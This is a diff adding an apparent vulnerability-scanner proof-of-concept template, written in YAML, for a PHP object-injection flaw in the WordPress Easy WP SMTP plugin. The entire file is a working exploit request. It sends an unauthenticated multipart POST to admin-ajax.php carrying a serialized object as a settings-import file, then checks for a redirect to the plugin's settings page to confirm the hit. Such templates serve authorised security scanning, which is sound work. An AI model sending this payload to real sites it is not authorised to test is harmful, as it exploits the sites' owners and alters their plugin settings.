@@ -1,0 +1,51 @@
+id: poc-yaml-wordpress-easy-wp-smtp-object-injection
+info:
+  name: WordPress Easy WP SMTP 插件 Object Injection 漏洞
+  severity: high
+  finger: WordPress
+  tags:
+  - 反序列化
+  osprey-id: vb_2019_0015
+variables:
+  r_path: '/wordpress/wp-admin/admin-ajax.php
+
+    /wp-admin/admin-ajax.php
+
+    /blog/wp-admin/admin-ajax.php'
+requests:
+- method: POST
+  path: '{{.r_path}}'
+  headers:
+    Content-Type: multipart/form-data;boundary=------------------------32437ffa4c7fd5f3
+  data: '--------------------------32437ffa4c7fd5f3
+
+    Content-Disposition: form-data; name="action"
+
+
+    swpsmtp_clear_log
+
+    --------------------------32437ffa4c7fd5f3
+
+    Content-Disposition: form-data; name="swpsmtp_import_settings"
+
+
+    1
+
+    --------------------------32437ffa4c7fd5f3
+
+    Content-Disposition: form-data; name="swpsmtp_import_settings_file"; filename="upload.txt"
+
+    Content-Type: text/plain
+
+
+    a:2:{s:4:"data";s:28:"a:1:{s:4:"test";s:4:"test";}";s:8:"checksum";s:32:"9630c1efb63ffa0db8d2c94163484284";}
+
+    --------------------------32437ffa4c7fd5f3--'
+  expression: 'status_code != 400 && status_code != 404
+
+    && contains(headers, "Location")
+
+    && contains(headers, "/wp-admin/options-general.php?page=swpsmtp_settings")
+
+    '
+transport: http
